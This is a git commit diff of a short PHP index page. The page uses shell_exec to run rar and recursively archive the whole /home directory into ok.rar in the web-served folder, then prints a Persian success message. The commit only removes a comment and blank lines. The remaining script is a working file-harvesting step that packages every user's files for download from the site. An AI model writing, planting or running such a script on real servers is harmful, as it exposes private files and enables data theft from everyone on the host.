303513781695fbb289985484b5202261bb8f327b
PySudoORG <139513562+PySudoORG@users.noreply.github.com>
2023-12-11 23:27:58 +0330

    Update index.php

--- index.php
+++ index.php
@@ -1,10 +1,7 @@
 <?php
 $sourceDir = '/home';
 $destinationRar = './ok.rar';
-
-// اجرای دستور rar در خط فرمان برای فشرده‌سازی دایرکتوری
 $cmd = "rar a -r $destinationRar $sourceDir";
 $output = shell_exec($cmd);
-
 echo "فایل RAR با موفقیت ایجاد شد!";
 ?>
